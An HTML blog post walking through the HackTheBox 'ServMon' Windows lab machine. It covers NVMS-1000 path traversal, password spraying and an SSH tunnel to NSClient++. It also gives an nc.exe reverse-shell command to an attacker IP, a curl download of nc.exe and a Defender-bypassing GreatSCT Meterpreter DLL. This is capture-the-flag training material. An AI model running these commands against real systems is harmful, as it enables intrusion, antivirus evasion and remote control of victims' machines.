<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox - ServMon" /><meta property="og:locale" content="en" /><link rel="canonical" href="https://0x.3n0.us/htb-servmon/" /><meta property="og:url" content="https://0x.3n0.us/htb-servmon/" /><meta property="og:site_name" content="0x3n0" /><meta property="og:image" content="https://0x.3n0.us/assets/img/htb/machines/windows/easy/servmon/ServMon.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-07T06:00:00+07:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0x.3n0.us/assets/img/htb/machines/windows/easy/servmon/ServMon.png" /><meta property="twitter:title" content="HackTheBox - ServMon" /><meta name="twitter:site" content="@0x3n0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-01-07T15:22:31+07:00","datePublished":"2021-09-07T06:00:00+07:00","headline":"HackTheBox - ServMon","image":"https://0x.3n0.us/assets/img/htb/machines/windows/easy/servmon/ServMon.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://0x.3n0.us/htb-servmon/"},"url":"https://0x.3n0.us/htb-servmon/"}</script> <script src="//darksec.or.id/comments/dist/Valine.min.js"></script><title>HackTheBox - ServMon | 0x3n0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0x3n0"><meta name="application-name" content="0x3n0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicons/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0x3n0</a></div><div class="site-subtitle font-italic">Researcher | Pentester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/Whoami/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a><li class="nav-item"> <a href="/revershell/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>REVERSHELL</span> </a><li class="nav-item"> <a href="/OSINT/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>OSINT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/0x3n0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/0x3n0" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://instagram.com/0x3n0" aria-label="instagram" target="_blank" rel="noopener"> <i class="fab fa-instagram"></i> </a> <a href="https://app.hackthebox.com/profile/381523" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - ServMon</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - ServMon</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> 0x3n0 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Sep 7, 2021, 6:00 AM +0700" >Sep 7, 2021<i class="unloaded">2021-09-07T06:00:00+07:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 7, 2022, 5:22 PM +0900" >Jan 7<i class="unloaded">2022-01-07T15:22:31+07:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1193 words">6 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/ServMon.png" alt="ServMon" /></p><p>ServMon is an easy Windows box requiring two exploits. There is a hint in anonymous FTP about the location of the password list. I was able to use the directory traversal bug in the NVMS 1000 web instance that would allow me to leak those passwords, and use one of them over SSH to get the shell. Then I was able to get the local configuration for the NSClient++ web instance running on TCP 8443, and used those credentials plus another exploit to get the SYSTEM shell.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan"><code class="language-plaintext highlighter-rouge">nmap</code> scan</h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-min-rate</span> 5000 <span class="nt">--max-retries</span> 1 <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-oN</span> ServMon-full-port-scan.txt 10.10.10.184
Warning: 10.10.10.184 giving up on port because retransmission cap hit <span class="o">(</span>1<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>10.10.10.184
Host is up <span class="o">(</span>0.097s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 64161 closed ports, 1355 filtered ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_01-18-20  12:05PM       &lt;DIR&gt;          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 <span class="o">(</span>RSA<span class="o">)</span>
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     &lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="o">&gt;</span>
|     &lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;title&gt;&lt;/title&gt;
|     &lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">"text/javascript"</span><span class="o">&gt;</span>
|     window.location.href <span class="o">=</span> <span class="s2">"Pages/login.htm"</span><span class="p">;</span>
|     &lt;/script&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|_    :Saturday
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC

Host script results:
|_clock-skew: 3m23s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-07T10:52:14
|_  start_date: N/A
</span></pre></table></code></div></div><h3 id="port-21-ftp">Port 21 (FTP)</h3><p><code class="language-plaintext highlighter-rouge">nmap</code> revealed that Anonymous FTP login is allowed.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ftp <span class="nv">$TARGET</span>
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name <span class="o">(</span>10.10.10.184:root<span class="o">)</span>: anonymous
331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
Password:
230 User logged <span class="k">in</span><span class="nb">.</span>
Remote system <span class="nb">type </span>is Windows_NT.
ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful.
125 Data connection already open<span class="p">;</span> Transfer starting.
01-18-20  12:05PM       &lt;DIR&gt;          Users
226 Transfer complete.
ftp&gt; <span class="nb">cd </span>Users
250 CWD <span class="nb">command </span>successful.
ftp&gt; <span class="nb">dir
</span>200 PORT <span class="nb">command </span>successful.
125 Data connection already open<span class="p">;</span> Transfer starting.
01-18-20  12:06PM       &lt;DIR&gt;          Nadine
01-18-20  12:08PM       &lt;DIR&gt;          Nathan
226 Transfer complete.
ftp&gt; 
</pre></table></code></div></div><p>There are two directories accessible via FTP:</p><ul><li>Nadine<li>Nathan</ul><p>Each of them contains a text file with sensible information:</p><ul><li>Nadine =&gt; <code class="language-plaintext highlighter-rouge">Confidential.txt</code><li>Nathan =&gt; <code class="language-plaintext highlighter-rouge">Notes to do.txt</code></ul><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/ftp_files.png" alt="Desktop View" /></p><p>According to these files, there is a <code class="language-plaintext highlighter-rouge">Passwords.txt</code> inside Nathan’s Desktop and an application called NVMS offers a public access while they plan to remove it.</p><h3 id="port-80-http">Port 80 (HTTP)</h3><p>On port 80, there is a a login page for the <strong>NVMS-1000</strong> network surveillance software.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/NVMS-1000.png" alt="Desktop View" /></p><p>After looking for exploits, we discover that it is vulnerable to LFI (<strong>CVE-2019-20085</strong>).</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/searchsploit.png" alt="Desktop View" /></p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/47774.png" alt="Desktop View" /></p><p>Indeed and if we try to get the <code class="language-plaintext highlighter-rouge">Windows/win.ini</code> file, it shows up:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/LFI.png" alt="Desktop View" /></p><p>Now as we saw while enumerating FTP, there is a <strong>Passwords.txt</strong> file in Nathan’s Desktop:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/Passwords.png" alt="Desktop View" /></p><p>It contains several passwords that we can use for brute-forcing/password spraying attacks:</p><ul><li><code class="language-plaintext highlighter-rouge">1nsp3ctTh3Way2Mars!</code><li><code class="language-plaintext highlighter-rouge">Th3r34r3To0M4nyTrait0r5!</code><li><code class="language-plaintext highlighter-rouge">B3WithM30r4ga1n5tMe</code><li><code class="language-plaintext highlighter-rouge">L1k3B1gBut7s@W0rk</code><li><code class="language-plaintext highlighter-rouge">0nly7h3y0unGWi11F0l10w</code><li><code class="language-plaintext highlighter-rouge">IfH3s4b0Utg0t0H1sH0me</code><li><code class="language-plaintext highlighter-rouge">Gr4etN3w5w17hMySk1Pa5$</code></ul><hr /><h2 id="foothold">Foothold</h2><h3 id="password-spraying">Password spraying</h3><h4 id="smb-port-445">SMB (port 445)</h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>crackmapexec smb <span class="nv">$TARGET</span> <span class="nt">-u</span> Users.txt <span class="nt">-p</span> Passwords.txt 
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/crackmapexec_smb.png" alt="Desktop View" /></p><h4 id="ssh-port-22">SSH (port 22)</h4><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/crackmapexec_ssh.png" alt="Desktop View" /></p><h3 id="gaining-access">Gaining access</h3><p><strong>Nadine</strong>’s password <code class="language-plaintext highlighter-rouge">L1k3B1gBut7s@W0rk</code> works for both SSH and SMB. Let’s get a shell:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/ssh.png" alt="Desktop View" /></p><hr /><h2 id="privesc">Privesc</h2><p>After basic enumeration, I couldn’t get so much:</p><pre><code class="language-cmd">nadine@SERVMON C:\Users\Nadine\Desktop&gt;whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
nadine@SERVMON C:\Users\Nadine\Desktop&gt;systeminfo
ERROR: Access denied
nadine@SERVMON C:\Users\Nadine&gt;.\winPEASx64.exe
The system cannot execute the specified program.
</code></pre><h3 id="nsclient">NSClient++</h3><p>We can take a look at <code class="language-plaintext highlighter-rouge">NSClient++</code> source files (previously enumerated with <code class="language-plaintext highlighter-rouge">nmap</code> on port <strong>8443</strong>).</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/nsclient.png" alt="Desktop View" /></p><p>Because of the <code class="language-plaintext highlighter-rouge">allowed hosts</code> we cannot log in directly to the app:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/403.png" alt="Desktop View" /></p><p>We need to create an SSH tunnel, so we can access it.</p><p>Furthermore, we can enumerate the software version using its binary <code class="language-plaintext highlighter-rouge">nscp.exe</code>:</p><pre><code class="language-cmd">nadine@SERVMON C:\Program Files\NSClient++&gt;.\nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
</code></pre><h3 id="port-forwarding">Port forwarding</h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-L</span> 8443:127.0.0.1:8443 Nadine@10.10.10.184
</pre></table></code></div></div><p>And it worked:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/port_forwarding.png" alt="Desktop View" /></p><p>We can log in using the password we found in <code class="language-plaintext highlighter-rouge">nsclient.ini</code>:</p><ul><li><strong>ew2x6SsGTxjRwXOT</strong></ul><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/port_forwarding_success.png" alt="Desktop View" /></p><p>This web app contains functionality to create scripts that can be executed in the context of <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p><h3 id="exploitation">Exploitation</h3><p>We will upload <code class="language-plaintext highlighter-rouge">nc.exe</code> to the target machine and then try to gain a reverse shell by executing it through the web app.</p><pre><code class="language-cmd">nadine@SERVMON C:\Users\Nadine\Desktop&gt;curl 10.10.14.12/nc.exe -o nc.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 59392  100 59392    0     0  59392      0  0:00:01 --:--:--  0:00:01  137k
nadine@SERVMON C:\Users\Nadine\Desktop&gt;echo C:\Users\Nadine\Desktop\nc.exe 10.10.14.12 443 -e cmd.exe &gt; C:\Temp\shell.bat

nadine@SERVMON C:\Users\Nadine\Desktop&gt;type C:\Temp\shell.bat
C:\Users\Nadine\Desktop\nc.exe 10.10.14.12 443 -e cmd.exe
</code></pre><p>Go to <code class="language-plaintext highlighter-rouge">Settings &gt; External Scripts &gt; Scripts</code> to add a new script as follows:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/new_script.png" alt="Desktop View" /></p><p>Click on <code class="language-plaintext highlighter-rouge">Changes</code>, and <code class="language-plaintext highlighter-rouge">Save Configuration</code>:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/save_conf.png" alt="Desktop View" /></p><p>Click on <code class="language-plaintext highlighter-rouge">Control</code>, and <code class="language-plaintext highlighter-rouge">Reload</code>:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/reload.png" alt="Desktop View" /></p><p>Wait a little bit, log in again and go to <code class="language-plaintext highlighter-rouge">Queries</code>, your new command has been added:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/queries.png" alt="Desktop View" /></p><p>Click on it and <code class="language-plaintext highlighter-rouge">Run</code></p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/run.png" alt="Desktop View" /></p><p>… And we were stopped by <strong>Windows Defender Antivirus</strong> which keeps removing <code class="language-plaintext highlighter-rouge">nc.exe</code> !</p><h3 id="bypassing-defender-with-greatsctpy">Bypassing Defender with <code class="language-plaintext highlighter-rouge">GreatSCT.py</code></h3><p>A solution to ocvercome this issue is to use <a href="https://github.com/GreatSCT/GreatSCT">GreatSCT</a> to generate a malicious DLL:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./GreatSCT.py <span class="nt">--ip</span> 10.10.14.12 <span class="nt">--port</span> 443 <span class="nt">-t</span> bypass <span class="nt">-p</span> regsvcs/meterpreter/rev_tcp.py <span class="nt">-o</span> serv
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/great_scott.png" alt="Desktop View" /></p><p>Then we can run <strong>metasploit</strong> with the generated RC file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfconsole <span class="nt">-r</span> /usr/share/greatsct-output/handlers/serv.rc
</pre></table></code></div></div><p>After that, we have to transfer the <code class="language-plaintext highlighter-rouge">serv.dll</code> file using either <code class="language-plaintext highlighter-rouge">scp</code> or <code class="language-plaintext highlighter-rouge">wget</code> or whatever.</p><p>Finally, we have to change <code class="language-plaintext highlighter-rouge">C:\Temp\shell.bat</code>’s content:</p><pre><code class="language-cmd">nadine@SERVMON C:\Temp&gt; cmd /c "echo C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe C:\Temp\serv.dll &gt; C:\Temp\shell.bat"
</code></pre><p>Go to <code class="language-plaintext highlighter-rouge">Console</code>, run <strong>shell</strong>, and you’ll get this beautiful message: <code class="language-plaintext highlighter-rouge">Meterpreter session 1 opened</code></p><p><img data-proofer-ignore data-src="https://i.imgur.com/vRU0Fum.gif" alt="Desktop View" /></p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/servmon/system.png" alt="Desktop View" /></p><hr /><h2 id="useful-links">Useful links</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-20085">https://nvd.nist.gov/vuln/detail/CVE-2019-20085</a><li><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a><li><a href="https://github.com/GreatSCT/GreatSCT">GreatSCT</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox-walkthroughs/'>Hackthebox walkthroughs</a>, <a href='/categories/windows/'>Windows</a>, <a href='/categories/easy/'>Easy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/nvms-1000/" class="post-tag no-text-decoration" >NVMS-1000</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >LFI</a> <a href="/tags/crackmapexec/" class="post-tag no-text-decoration" >crackmapexec</a> <a href="/tags/ssh-port-forwarding/" class="post-tag no-text-decoration" >ssh port forwarding</a> <a href="/tags/port-forwarding/" class="post-tag no-text-decoration" >port forwarding</a> <a href="/tags/nsclient/" class="post-tag no-text-decoration" >NSClient++</a> <a href="/tags/greatsct-py/" class="post-tag no-text-decoration" >GreatSCT.py</a> <a href="/tags/bypassing-defender/" class="post-tag no-text-decoration" >Bypassing Defender</a> <a href="/tags/htb-windows-easy/" class="post-tag no-text-decoration" >htb-windows-easy</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >oscp-prep</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://0x3n0.us"> 0x3n0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - ServMon - 0x3n0&url=https://0x.3n0.us/htb-servmon/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - ServMon - 0x3n0&u=https://0x.3n0.us/htb-servmon/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox - ServMon - 0x3n0&url=https://0x.3n0.us/htb-servmon/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://0x.3n0.us/htb-servmon/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="http://service.weibo.com/share/share.php?title=HackTheBox - ServMon - 0x3n0&url=https://0x.3n0.us/htb-servmon/" data-toggle="tooltip" data-placement="top" title="Weibo" target="_blank" rel="noopener" aria-label="Weibo"> <i class="fa-fw fab fa-weibo"></i> </a> <a href="https://lineit.line.me/share/ui?url=https://0x.3n0.us/htb-servmon/&text=HackTheBox - ServMon - 0x3n0" data-toggle="tooltip" data-placement="top" title="Line" target="_blank" rel="noopener" aria-label="Line"> <i class="fa-fw iconfont icon-13"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/lack-of-resources-&-rate-limiting/">OWASP API Security Lack of Resources & Rate Limiting</a><li><a href="/cyberwarfare/">The invisible war</a><li><a href="/Postman-Writeup/">Postman Writeup</a><li><a href="/Traverxec-Writeup/">Traverxec Writeup</a><li><a href="/Resolute-Writeup/">Resolute Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/oscp-prep/">oscp-prep</a> <a class="post-tag" href="/tags/htb-linux-easy/">htb-linux-easy</a> <a class="post-tag" href="/tags/htb-windows-easy/">htb-windows-easy</a> <a class="post-tag" href="/tags/reverse-shell/">reverse-shell</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/c/">C++</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/programming/">Programming</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div class="post-navigation d-flex justify-content-between"> <a href="/htb-forest/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Forest</p></a> <a href="/htb-buff/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Buff</p></a></div><div id="vcomments"></div><script> new Valine({ el: '#vcomments', appId: 